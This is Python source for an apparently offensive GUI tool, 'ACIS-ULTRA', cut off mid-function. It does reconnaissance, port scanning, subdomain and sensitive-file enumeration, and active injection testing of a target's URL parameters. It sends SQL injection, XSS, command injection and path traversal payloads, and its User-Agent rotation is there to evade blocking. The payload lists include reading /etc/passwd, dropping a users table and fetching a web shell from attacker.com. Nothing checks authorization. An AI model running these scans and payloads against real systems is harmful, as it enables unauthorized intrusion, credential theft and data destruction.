#!/usr/bin/env python3
"""
ACIS-ULTRA v8.0 | ADVANCED Penetration Testing & Exploitation System
PROJECT OLYMP | VER: 8.0.0 | KRONOS ADVANCED MODE
"""

import sys
import os
import dearpygui.dearpygui as dpg
import json
import re
import threading
import time
import socket
import struct
import subprocess
import tempfile
import hashlib
import base64
import string
import itertools
import logging
from datetime import datetime
import random
import secrets
from urllib.parse import urlparse, quote, parse_qs, unquote
import warnings
warnings.filterwarnings('ignore')

# Импорты с обработкой ошибок
try:
    import requests
    from bs4 import BeautifulSoup
    import dns.resolver
    import whois
    import psutil
    import concurrent.futures
    import paramiko
    import cryptocode
    from scapy.all import *
    from scapy.layers import http
    import argon2
    import pyftpdlib
    from pyftpdlib.authorizers import DummyAuthorizer
    from pyftpdlib.handlers import FTPHandler
    from pyftpdlib.servers import FTPServer
    import netifaces
    print("[+] Все зависимости загружены")
except ImportError as e:
    print(f"[-] Ошибка: {e}")
    print("\nУстановите зависимости:")
    print("pip install requests beautifulsoup4 dnspython python-whois psutil paramiko cryptocode scapy argon2-cffi pyftpdlib netifaces")
    sys.exit(1)

# ИНИЦИАЛИЗАЦИЯ DPG
dpg.create_context()

# Создание viewport
dpg.create_viewport(
    title='ACIS ULTRA v8.0 | Advanced Penetration System',
    width=1700,
    height=950,
    resizable=True
)

dpg.setup_dearpygui()

# ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
ANALYSIS_RESULTS = {}
HISTORY = []
ATTACK_RUNNING = False
EXPLOIT_RUNNING = False
MITM_RUNNING = False
BRUTEFORCE_RUNNING = False
ATTACK_THREAD = None
EXPLOIT_THREAD = None
MITM_THREAD = None
BRUTEFORCE_THREAD = None
SESSION_TOKENS = {}
CAPTURED_DATA = []
PROXY_CONFIG = {"enabled": False, "host": "", "port": ""}

# ЦВЕТОВАЯ СХЕМА
COLORS = {
    "bg_dark": [10, 15, 25, 255],
    "bg_medium": [20, 30, 45, 255],
    "bg_light": [35, 50, 70, 255],
    "accent_cyan": [0, 180, 255, 255],
    "accent_green": [0, 255, 120, 255],
    "accent_red": [255, 40, 80, 255],
    "accent_yellow": [255, 180, 0, 255],
    "accent_purple": [160, 80, 255, 255],
    "accent_orange": [255, 120, 0, 255],
    "text_primary": [245, 245, 255, 255],
    "text_secondary": [170, 170, 190, 255],
    "success": [0, 220, 100, 255],
    "warning": [255, 140, 0, 255],
    "error": [255, 60, 60, 255],
    "critical": [255, 0, 0, 255]
}

# ==================== ADVANCED ANALYZER CLASS ====================

class AdvancedSiteAnalyzer:
    def __init__(self):
        self.session = self.create_stealth_session()
        self.deep_scan_results = {}
        
    def create_stealth_session(self):
        """Создание скрытой сессии с ротацией заголовков"""
        session = requests.Session()
        session.verify = False
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        })
        return session
    
    def rotate_user_agent(self):
        """Ротация User-Agent для избежания блокировки"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1'
        ]
        self.session.headers['User-Agent'] = random.choice(user_agents)
    
    def deep_analyze(self, url):
        """Глубокий анализ сайта со всеми проверками"""
        print(f"[*] Начинаем глубокий анализ: {url}")
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        parsed = urlparse(url)
        domain = parsed.netloc
        
        # Полный анализ
        results = {
            'url': url,
            'domain': domain,
            'ip_info': self.get_ip_info(domain),
            'tech_stack': self.detect_tech_stack(url),
            'ports_services': self.comprehensive_port_scan(domain),
            'security_analysis': self.comprehensive_security_analysis(url),
            'vulnerabilities': [],
            'critical_issues': [],
            'subdomains': [],
            'directory_enum': [],
            'sensitive_data': [],
            'headers_analysis': self.deep_headers_analysis(url),
            'cms_analysis': self.advanced_cms_analysis(url),
            'auth_forms': [],
            'api_endpoints': [],
            'error_messages': [],
            'cookies_analysis': self.analyze_cookies(url),
            'waf_detection': self.detect_waf(url),
            'cloud_detection': self.detect_cloud_provider(url)
        }
        
        # Глубокие проверки (параллельно)
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = {
                executor.submit(self.advanced_vulnerability_scan, url): 'vuln',
                executor.submit(self.enumerate_subdomains, domain): 'subdomains',
                executor.submit(self.directory_and_file_enum, url): 'dirs',
                executor.submit(self.find_auth_forms, url): 'auth',
                executor.submit(self.find_api_endpoints, url): 'api',
                executor.submit(self.extract_error_messages, url): 'errors',
                executor.submit(self.check_backup_files, url): 'backups',
                executor.submit(self.check_config_files, url): 'configs',
                executor.submit(self.check_debug_pages, url): 'debug',
                executor.submit(self.check_exposed_admin, url): 'admin'
            }
            
            for future in concurrent.futures.as_completed(futures):
                key = futures[future]
                try:
                    data = future.result()
                    if key == 'vuln':
                        results['vulnerabilities'] = data['vulns']
                        results['critical_issues'] = data['critical']
                    elif key == 'subdomains':
                        results['subdomains'] = data
                    elif key == 'dirs':
                        results['directory_enum'] = data
                    elif key == 'auth':
                        results['auth_forms'] = data
                    elif key == 'api':
                        results['api_endpoints'] = data
                    elif key == 'errors':
                        results['error_messages'] = data
                except Exception as e:
                    print(f"Ошибка в анализе {key}: {e}")
        
        self.deep_scan_results = results
        return results
    
    def get_ip_info(self, domain):
        """Полная информация об IP"""
        info = {}
        try:
            # Основной IP
            info['primary_ip'] = socket.gethostbyname(domain)
            
            # Все A записи
            try:
                answers = dns.resolver.resolve(domain, 'A')
                info['all_ips'] = [str(rdata) for rdata in answers]
            except:
                info['all_ips'] = [info['primary_ip']]
            
            # MX записи
            try:
                mx_answers = dns.resolver.resolve(domain, 'MX')
                info['mx_records'] = [str(rdata.exchange) for rdata in mx_answers]
            except:
                info['mx_records'] = []
            
            # TXT записи
            try:
                txt_answers = dns.resolver.resolve(domain, 'TXT')
                info['txt_records'] = [str(rdata) for rdata in txt_answers]
            except:
                info['txt_records'] = []
            
            # NS записи
            try:
                ns_answers = dns.resolver.resolve(domain, 'NS')
                info['ns_records'] = [str(rdata) for rdata in ns_answers]
            except:
                info['ns_records'] = []
            
            # WHOIS информация
            try:
                w = whois.whois(domain)
                info['whois'] = {
                    'registrar': w.registrar,
                    'creation_date': w.creation_date,
                    'expiration_date': w.expiration_date,
                    'name_servers': w.name_servers
                }
            except:
                info['whois'] = {}
            
        except Exception as e:
            info['error'] = str(e)
        
        return info
    
    def detect_tech_stack(self, url):
        """Определение всего стека технологий"""
        tech = {}
        try:
            self.rotate_user_agent()
            response = self.session.get(url, timeout=8)
            content = response.text.lower()
            headers = response.headers
            
            # Сервер и язык
            tech['server'] = headers.get('Server', 'Не определен')
            tech['powered_by'] = headers.get('X-Powered-By', headers.get('X-Generator', 'Не определен'))
            
            # Фреймворки
            framework_patterns = {
                'Laravel': ['laravel', '_token', 'csrf-token'],
                'Django': ['django', 'csrftoken', 'sessionid'],
                'Ruby on Rails': ['rails', '_rails_session'],
                'Express.js': ['express', 'x-powered-by: express'],
                'Spring': ['spring', 'jsessionid'],
                'ASP.NET': ['asp.net', 'viewstate', '__requestverificationtoken'],
                'Flask': ['flask', 'session=']
            }
            
            for fw, patterns in framework_patterns.items():
                if any(pattern in content or pattern.lower() in str(headers).lower() for pattern in patterns):
                    tech['framework'] = fw
                    break
            
            # JavaScript фреймворки
            js_frameworks = {
                'React': ['react', 'react-dom', '__next'],
                'Vue.js': ['vue', 'vue.js'],
                'Angular': ['angular', 'ng-'],
                'jQuery': ['jquery', 'jquery.min.js']
            }
            
            for js, patterns in js_frameworks.items():
                if any(pattern in content for pattern in patterns):
                    tech['javascript'] = js
                    break
            
            # CMS детекция
            cms_patterns = {
                'WordPress': [
                    'wp-content', 'wp-includes', 'wordpress', 
                    'wp-json', '/wp-admin/', 'wp-embed.min.js'
                ],
                'Joomla': [
                    'joomla', 'com_joomla', 'index.php?option=com',
                    '/media/system/js/', 'joomla_'
                ],
                'Drupal': [
                    'drupal', 'sites/all', 'drupal.js',
                    'drupal.format_date', 'Drupal.settings'
                ],
                'Magento': [
                    'magento', '/skin/frontend/', '/media/',
                    'Mage.Cookies', 'mage/'
                ],
                'Shopify': [
                    'shopify', 'cdn.shopify.com', 'shopify.shop',
                    'window.Shopify'
                ],
                'PrestaShop': [
                    'prestashop', 'prestashop.js', 'prestashop.css'
                ],
                'OpenCart': ['opencart', 'catalog/view/theme'],
                'Bitrix': ['bitrix', 'bx', 'bitrix/js']
            }
            
            for cms, patterns in cms_patterns.items():
                if any(pattern in content for pattern in patterns):
                    tech['cms'] = cms
                    
                    # Определение версии CMS
                    version = self.detect_cms_version(content, cms)
                    if version:
                        tech['cms_version'] = version
                    break
            
            # Базы данных
            db_patterns = {
                'MySQL': ['mysql', 'mysqli_connect', 'mysql_fetch'],
                'PostgreSQL': ['postgresql', 'pg_', 'postgres'],
                'MongoDB': ['mongodb', 'mongo', 'objectid'],
                'SQLite': ['sqlite', 'sqlite3'],
                'Oracle': ['oracle', 'oci_']
            }
            
            for db, patterns in db_patterns.items():
                if any(pattern in content for pattern in patterns):
                    tech['database'] = db
                    break
            
            # Кеширование
            cache_patterns = {
                'Redis': ['redis', 'predis'],
                'Memcached': ['memcached', 'memcache'],
                'Varnish': ['varnish', 'x-varnish'],
                'Cloudflare': ['cloudflare', '__cfduid', 'cf-ray']
            }
            
            for cache, patterns in cache_patterns.items():
                if any(pattern in content or pattern in str(headers) for pattern in patterns):
                    tech['caching'] = cache
                    break
            
        except Exception as e:
            tech['error'] = str(e)
        
        return tech
    
    def detect_cms_version(self, content, cms):
        """Определение версии CMS"""
        if cms == 'WordPress':
            # Поиск версии WordPress
            version_patterns = [
                r'content="WordPress (\d+\.\d+(\.\d+)?)',
                r'wp-embed.min.js\?ver=(\d+\.\d+(\.\d+)?)',
                r'wordpress (\d+\.\d+(\.\d+)?)',
                r'"version":"(\d+\.\d+(\.\d+)?)"'
            ]
            for pattern in version_patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    return match.group(1)
        
        elif cms == 'Joomla':
            match = re.search(r'Joomla!? (\d+\.\d+(\.\d+)?)', content, re.IGNORECASE)
            if match:
                return match.group(1)
        
        elif cms == 'Drupal':
            match = re.search(r'Drupal (\d+\.\d+(\.\d+)?)', content, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return None
    
    def comprehensive_port_scan(self, domain):
        """Всестороннее сканирование портов с определением сервисов"""
        ports_found = {}
        
        # Расширенный список портов
        all_ports = {
            # Веб
            80: 'HTTP', 443: 'HTTPS', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt',
            8000: 'HTTP-Alt2', 8008: 'HTTP-Alt3', 8888: 'HTTP-Alt4',
            
            # SSH и Telnet
            22: 'SSH', 2222: 'SSH-Alt', 23: 'Telnet',
            
            # Файловые протоколы
            21: 'FTP', 2121: 'FTP-Alt', 69: 'TFTP',
            2049: 'NFS', 111: 'RPCbind',
            
            # Базы данных
            3306: 'MySQL', 5432: 'PostgreSQL', 27017: 'MongoDB',
            1521: 'Oracle', 1433: 'MSSQL', 6379: 'Redis',
            
            # Удаленный доступ
            3389: 'RDP', 5900: 'VNC', 5800: 'VNC-HTTP',
            5901: 'VNC-1', 5902: 'VNC-2',
            
            # Почта
            25: 'SMTP', 465: 'SMTPS', 587: 'SMTP-submission',
            110: 'POP3', 995: 'POP3S', 143: 'IMAP', 993: 'IMAPS',
            
            # Разное
            53: 'DNS', 123: 'NTP', 161: 'SNMP', 389: 'LDAP',
            636: 'LDAPS', 873: 'Rsync', 514: 'Syslog',
            2048: 'DLS', 2049: 'NFS', 5060: 'SIP',
            
            # Веб-сервисы
            9000: 'PHP-FPM', 3000: 'Node.js', 5000: 'Flask/Django',
            9200: 'Elasticsearch', 5601: 'Kibana', 2701: 'SMS',
            
            # Уязвимые сервисы
            445: 'SMB', 139: 'NetBIOS', 135: 'MSRPC',
            1434: 'MSSQL Monitor', 4899: 'Radmin',
            6129: 'DameWare', 10000: 'Webmin'
        }
        
        try:
            ip = socket.gethostbyname(domain)
            
            def scan_port(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((ip, port))
                    
                    if result == 0:
                        # Получение баннера
                        banner = ""
                        try:
                            sock.settimeout(2)
                            if port == 80 or port == 443 or port == 8080 or port == 8443:
                                sock.send(b"GET / HTTP/1.0\r\n\r\n")
                            elif port == 21:
                                sock.send(b"\r\n")
                            elif port == 22:
                                sock.send(b"SSH-2.0-ACIS\r\n")
                            
                            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                            if len(banner) > 200:
                                banner = banner[:200] + "..."
                        except:
                            pass
                        
                        sock.close()
                        return {
                            'port': port,
                            'service': all_ports.get(port, 'Unknown'),
                            'banner': banner,
                            'status': 'OPEN'
                        }
                    sock.close()
                except:
                    pass
                return None
            
            # Многопоточное сканирование
            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                futures = [executor.submit(scan_port, port) for port in all_ports.keys()]
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result:
                        ports_found[result['port']] = result
            
            # Быстрое сканирование всех портов
            if len(ports_found) < 5:  # Если мало портов открыто
                print(f"[*] Быстрое сканирование всех портов на {ip}")
                for port in range(1, 1025):
                    if port not in ports_found:
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(0.1)
                            if sock.connect_ex((ip, port)) == 0:
                                ports_found[port] = {
                                    'port': port,
                                    'service': 'Unknown',
                                    'banner': '',
                                    'status': 'OPEN'
                                }
                            sock.close()
                        except:
                            pass
            
        except Exception as e:
            print(f"Ошибка сканирования портов: {e}")
        
        return ports_found
    
    def comprehensive_security_analysis(self, url):
        """Всесторонний анализ безопасности"""
        security = {
            'headers': {},
            'encryption': {},
            'cookies': {},
            'protocols': {},
            'misconfigurations': []
        }
        
        try:
            self.rotate_user_agent()
            response = self.session.get(url, timeout=10, allow_redirects=True)
            final_url = response.url
            
            # Анализ HTTPS
            security['encryption']['https'] = final_url.startswith('https://')
            security['encryption']['hsts'] = 'Strict-Transport-Security' in response.headers
            security['encryption']['redirect_http_to_https'] = url.startswith('http://') and final_url.startswith('https://')
            
            # Проверка качества SSL/TLS
            if final_url.startswith('https://'):
                try:
                    import ssl
                    import socket as sock
                    hostname = urlparse(final_url).netloc
                    context = ssl.create_default_context()
                    with context.wrap_socket(sock.socket(), server_hostname=hostname) as s:
                        s.settimeout(3)
                        s.connect((hostname, 443))
                        cert = s.getpeercert()
                        
                        # Проверка срока действия сертификата
                        from datetime import datetime
                        exp_date = cert['notAfter']
                        exp_datetime = datetime.strptime(exp_date, '%b %d %H:%M:%S %Y %Z')
                        days_left = (exp_datetime - datetime.now()).days
                        
                        security['encryption']['ssl_valid'] = days_left > 0
                        security['encryption']['ssl_days_left'] = days_left
                        security['encryption']['ssl_issuer'] = cert.get('issuer', [[('', '')]])[0][0][1]
                except:
                    security['encryption']['ssl_check'] = 'FAILED'
            
            # Анализ заголовков безопасности
            headers_to_check = {
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-Content-Type-Options': ['nosniff'],
                'X-XSS-Protection': ['1; mode=block'],
                'Content-Security-Policy': [],
                'Referrer-Policy': ['no-referrer', 'strict-origin'],
                'Permissions-Policy': [],
                'Feature-Policy': []
            }
            
            for header, good_values in headers_to_check.items():
                if header in response.headers:
                    security['headers'][header] = {
                        'present': True,
                        'value': response.headers[header],
                        'secure': any(good_value in response.headers[header] for good_value in good_values) if good_values else True
                    }
                else:
                    security['headers'][header] = {'present': False, 'secure': False}
                    security['misconfigurations'].append(f'Missing security header: {header}')
            
            # Проверка куки
            cookies = response.headers.get('Set-Cookie', '')
            if cookies:
                security['cookies']['httponly'] = 'HttpOnly' in cookies
                security['cookies']['secure'] = 'Secure' in cookies
                security['cookies']['samesite'] = 'SameSite' in cookies
                
                if not security['cookies']['httponly']:
                    security['misconfigurations'].append('Cookies without HttpOnly flag')
                if not security['cookies']['secure'] and final_url.startswith('https://'):
                    security['misconfigurations'].append('Secure cookies missing on HTTPS site')
            
            # Проверка методов HTTP
            try:
                methods = ['OPTIONS', 'TRACE', 'PUT', 'DELETE', 'PATCH']
                for method in methods:
                    test_resp = self.session.request(method, url, timeout=3)
                    if test_resp.status_code not in [405, 501, 403]:
                        security['protocols'][f'{method}_allowed'] = True
                        if method in ['TRACE', 'PUT']:
                            security['misconfigurations'].append(f'Dangerous HTTP method {method} enabled')
                    else:
                        security['protocols'][f'{method}_allowed'] = False
            except:
                pass
            
            # Проверка clickjacking
            if not security['headers']['X-Frame-Options']['present']:
                security['misconfigurations'].append('Clickjacking possible - X-Frame-Options missing')
            
            # Проверка MIME sniffing
            if not security['headers']['X-Content-Type-Options']['present']:
                security['misconfigurations'].append('MIME sniffing possible - X-Content-Type-Options missing')
            
        except Exception as e:
            security['error'] = str(e)
        
        return security
    
    def advanced_vulnerability_scan(self, url):
        """Расширенное сканирование уязвимостей"""
        vulns = []
        critical = []
        
        # Проверка параметров URL для инъекций
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        # SQL Injection проверки
        sql_payloads = [
            "'", "\"", "' OR '1'='1", "' AND 1=1--", 
            "' UNION SELECT null,null--", 
            "1' AND SLEEP(5)--", 
            "1' AND 1=(SELECT COUNT(*) FROM users)--",
            "1; DROP TABLE users--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SLEEP(5))--"
        ]
        
        for param_name, param_values in query_params.items():
            for param_value in param_values[:2]:  # Проверяем первые 2 значения
                for payload in sql_payloads[:6]:
                    try:
                        self.rotate_user_agent()
                        test_params = query_params.copy()
                        test_params[param_name] = [payload]
                        
                        # Создаем новый URL с payload
                        test_query = '&'.join([f"{k}={v[0]}" for k, v in test_params.items()])
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                        
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=5)
                        elapsed = time.time() - start_time
                        
                        # Поиск ошибок SQL
                        sql_errors = [
                            'sql', 'syntax', 'mysql', 'postgresql', 'oracle',
                            'database', 'odbc', 'driver', 'query failed',
                            'sqlite', 'microsoft jet', 'access database'
                        ]
                        
                        if any(error in response.text.lower() for error in sql_errors):
                            vuln = {
                                'type': 'SQL Injection',
                                'severity': 'Critical',
                                'param': param_name,
                                'payload': payload[:50],
                                'url': test_url[:100],
                                'evidence': 'SQL error in response'
                            }
                            vulns.append(vuln)
                            critical.append(vuln)
                            break
                        
                        # Time-based SQLi
                        if 'SLEEP' in payload.upper() and elapsed > 4:
                            vuln = {
                                'type': 'Blind SQL Injection (Time-based)',
                                'severity': 'Critical',
                                'param': param_name,
                                'payload': payload[:50],
                                'url': test_url[:100],
                                'evidence': f'Response delay: {elapsed:.1f}s'
                            }
                            vulns.append(vuln)
                            critical.append(vuln)
                            break
                            
                    except:
                        continue
        
        # XSS проверки
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "'><script>alert(1)</script>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)//",
            "\" onmouseover=\"alert(1)",
            "<body onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\">"
        ]
        
        for param_name, param_values in query_params.items():
            for param_value in param_values[:2]:
                for payload in xss_payloads[:4]:
                    try:
                        self.rotate_user_agent()
                        test_params = query_params.copy()
                        test_params[param_name] = [payload]
                        
                        test_query = '&'.join([f"{k}={v[0]}" for k, v in test_params.items()])
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                        
                        response = self.session.get(test_url, timeout=5)
                        
                        if payload in response.text:
                            vuln = {
                                'type': 'Cross-Site Scripting (XSS)',
                                'severity': 'High',
                                'param': param_name,
                                'payload': payload[:50],
                                'url': test_url[:100],
                                'evidence': 'Payload reflected in response'
                            }
                            vulns.append(vuln)
                            break
                            
                    except:
                        continue
        
        # Command Injection проверки
        cmd_payloads = [
            "; ls -la", "| cat /etc/passwd", "`id`", 
            "$(whoami)", "& dir", "&& ps aux",
            "| wget http://attacker.com/shell.php",
            "; ping -c 1 127.0.0.1"
        ]
        
        for param_name, param_values in query_params.items():
            for param_value in param_values[:1]:
                for payload in cmd_payloads[:3]:
                    try:
                        self.rotate_user_agent()
                        test_params = query_params.copy()
                        test_params[param_name] = [payload]
                        
                        test_query = '&'.join([f"{k}={v[0]}" for k, v in test_params.items()])
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                        
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=8)
                        elapsed = time.time() - start_time
                        
                        # Проверка результатов выполнения команд
                        cmd_indicators = ['root:', 'uid=', 'bin/', 'etc/passwd', 'total ', 'drwx']
                        
                        if any(indicator in response.text for indicator in cmd_indicators):
                            vuln = {
                                'type': 'Command Injection',
                                'severity': 'Critical',
                                'param': param_name,
                                'payload': payload[:50],
                                'url': test_url[:100],
                                'evidence': 'Command output in response'
                            }
                            vulns.append(vuln)
                            critical.append(vuln)
                            break
                            
                    except:
                        continue
        
        # File Inclusion проверки
        fi_payloads = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd"
        ]
        
        for param_name, param_values in query_params.items():
            for param_value in param_values[:1]:
                for payload in fi_payloads[:5]:
                    try:
                        self.rotate_user_agent()
                        test_params = query_params.copy()
                        test_params[param_name] = [payload]
                        
                        test_query = '&'.join([f"{k}={v[0]}" for k, v in test_params.items()])
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                        
                        response = self.session.get(test_url, timeout=5)
                        
                        if 'root:' in response.text or 'daemon:' in response.text:
                            vuln = {
                                'type': 'File Inclusion (LFI/RFI)',
                                'severity': 'High',
                                'param': param_name,
                                'payload': payload[:50],
                                'url': test_url[:100],
                                'evidence': 'Sensitive file content in response'
                            }
                            vulns.append(vuln)
                            break
                            
                    except:
                        continue
        
        # XXE проверки
        if 'xml' in response.text.lower() or 'soap' in response.text.lower():
            vulns.append({
                'type': 'Possible XXE',
                'severity': 'High',
                'evidence': 'XML/SOAP endpoints detected'
            })
        
        return {'vulns': vulns, 'critical': critical}
    
    def enumerate_subdomains(self, domain):
        """Перечисление поддоменов"""
        subdomains = []
        
        # Большой список поддоменов
        wordlist = [
            'www', 'mail', 'ftp', 'admin', 'webmail', 'server', 'ns1', 'ns2',
            'blog', 'dev', 'test', 'stage', 'api', 'mobile', 'static', 'cdn',
            'secure', 'portal', 'docs', 'support', 'shop', 'store', 'app',
            'demo', 'beta', 'staging', 'old', 'new', 'backup', 'web',
            'forum', 'community', 'news', 'download', 'uploads', 'media',
            'images', 'img', 'video', 'cdn1', 'cdn2', 'cdn3', 'assets',
            'files', 'share', 'cloud', 'email', 'smtp', 'pop', 'imap',
            'git', 'svn', 'vpn', 'remote', 'ssh', 'db', 'database',
            'mysql', 'postgres', 'mongodb', 'redis', 'elastic',
            'search', 'status', 'monitor', 'grafana', 'kibana',
            'jenkins', 'ci', 'build', 'test', 'qa', 'prod', 'production',
            'stg', 'uat', 'preprod', 'internal', 'private', 'secret',
            'hidden', 'panel', 'cpanel', 'whm', 'plesk', 'directadmin',
            'webdisk', 'webadmin', 'administrator', 'phpmyadmin',
            'myadmin', 'control', 'manager', 'system', 'sys', 'root',
            'super', 'superuser', 'god', 'admin1', 'admin2', 'admin3'
        ]
        
        for sub in wordlist:
            subdomain = f"{sub}.{domain}"
            try:
                socket.gethostbyname(subdomain)
                subdomains.append(subdomain)
                print(f"[+] Найден поддомен: {subdomain}")
            except:
                continue
        
        return subdomains
    
    def directory_and_file_enum(self, url):
        """Перечисление директорий и файлов"""
        found = []
        
        # Общий список директорий и файлов
        common_paths = [
            '/admin/', '/administrator/', '/wp-admin/', '/wp-login.php',
            '/login/', '/signin/', '/auth/', '/dashboard/', '/cp/',
            '/controlpanel/', '/backend/', '/console/', '/manager/',
            '/phpmyadmin/', '/myadmin/', '/pma/', '/adminer.php',
            '/webadmin/', '/sqladmin/', '/mysql/', '/dbadmin/',
            '/backup/', '/backups/', '/backup.zip/', '/backup.tar.gz',
            '/dump.sql/', '/database.sql/', '/backup.sql',
            '/config/', '/configuration/', '/conf/', '/settings/',
            '.env', '.git/', '.svn/', '.hg/', '/.git/config',
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
            '/clientaccesspolicy.xml', '/security.txt', '/.well-known/',
            '/api/', '/api/v1/', '/api/v2/', '/graphql', '/graphiql',
            '/swagger.json', '/swagger-ui/', '/openapi.json',
            '/uploads/', '/files/', '/images/', '/media/', '/assets/',
            '/tmp/', '/temp/', '/cache/', '/logs/', '/error_log',
            '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
            '/admin.php', '/install.php', '/setup.php', '/config.php',
            '/wp-config.php', '/configuration.php', '/settings.php',
            '/.DS_Store', '/.htaccess', '/.htpasswd', '/web.config',
            '/server-status', '/server-info', '/.git/HEAD'
        ]
        
        base_url = url.rstrip('/')
        
        for path in common_paths:
            test_url = f"{base_url}{path}"
            try:
                self.rotate_user_agent()
                response = self.session.get(test_url, timeout=3)
                
                if response.status_code == 200:
                    found.append({
                        'url': test_url,
                        'status': response.status_code,
                        'size': len(response.text)
                    })
                elif response.status_code == 403:
                    found.append({
                        'url': test_url,
                        'status': response.status_code,
                        'note': 'FORBIDDEN - but exists'
                    })
                elif response.status_code == 401:
                    found.append({
                        'url': test_url,
                        'status': response.status_code,
                        'note': 'UNAUTHORIZED - requires auth'
                    })
                    
            except:
                continue
        
        return found
    
    def deep_headers_analysis(self, url):
        """Глубокий анализ заголовков"""
        analysis = {}
        try:
            self.rotate_user_agent()
            response = self.session.head(url, timeout=5)
            headers = response.headers
            
            # Проверка всех заголовков
            for header, value in headers.items():
                analysis[header] = {
                    'value': value,
                    'security_implications': self.get_header_security_implication(header, value)
                }
            
            # Проверка отсутствующих заголовков безопасности
            required_headers = [
                'Strict-Transport-Security',
                'X-Frame-Options',
                'X-Content-Type-Options',
                'X-XSS-Protection',
                'Content-Security-Policy',
                'Referrer-Policy',
                'Permissions-Policy'
            ]
            
            missing = []
            for header in required_headers:
                if header not in headers:
                    missing.append(header)
            
            analysis['missing_headers'] = missing
            analysis['server_info'] = headers.get('Server', 'Not disclosed')
            analysis['powered_by'] = headers.get('X-Powered-By', 'Not disclosed')
            
        except Exception as e:
            analysis['error'] = str(e)
        
        return analysis
    
    def get_header_security_implication(self, header, value):
        """Анализ безопасности заголовка"""
        implications = []
        
        header_lower = header.lower()
        value_lower = value.lower()
        
        if header_lower == 'server':
            if 'apache' in value_lower:
                implications.append('Apache server - check for version-specific vulnerabilities')
            elif 'nginx' in value_lower:
                implications.append('Nginx server - check for configuration issues')
            elif 'iis' in value_lower:
                implications.append('Microsoft IIS - check for IIS-specific vulnerabilities')
        
        elif header_lower == 'x-powered-by':
            if 'php' in value_lower:
                implications.append('PHP detected - check version for known vulnerabilities')
            elif 'asp.net' in value_lower:
                implications.append('ASP.NET detected')
        
        elif header_lower == 'strict-transport-security':
            if 'max-age=0' in value_lower:
                implications.append('HSTS disabled - allows downgrade attacks')
            elif 'max-age=' in value_lower:
                implications.append('HSTS enabled - good practice')
        
        elif header_lower == 'x-frame-options':
            if 'deny' in value_lower or 'sameorigin' in value_lower:
                implications.append('Clickjacking protection enabled')
            else:
                implications.append('Clickjacking protection misconfigured')
        
        return implications if implications else ['No major security implications detected']
    
    def advanced_cms_analysis(self, url):
        """Продвинутый анализ CMS"""
        analysis = {}
        
        try:
            self.rotate_user_agent()
            response = self.session.get(url, timeout=5)
            content = response.text
            
            # Определение плагинов WordPress
            if 'wp-content' in content:
                analysis['cms'] = 'WordPress'
                
                # Поиск плагинов
                plugin_patterns = [
                    r'wp-content/plugins/([^/]+)/',
                    r'plugins/([^/]+)/',
                    r'/([a-z0-9\-]+)/css/style.css',
                    r'/([a-z0-9\-]+)/js/script.js'
                ]
                
                plugins = set()
                for pattern in plugin_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    plugins.update(matches)
                
                analysis['plugins'] = list(plugins)[:20]  # Ограничим вывод
                
                # Поиск тем
                theme_patterns = [
                    r'wp-content/themes/([^/]+)/',
                    r'themes/([^/]+)/'
                ]
                
                themes = set()
                for pattern in theme_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    themes.update(matches)
                
                analysis['themes'] = list(themes)[:10]
            
            # Определение компонентов Joomla
            elif 'joomla' in content.lower():
                analysis['cms'] = 'Joomla'
                
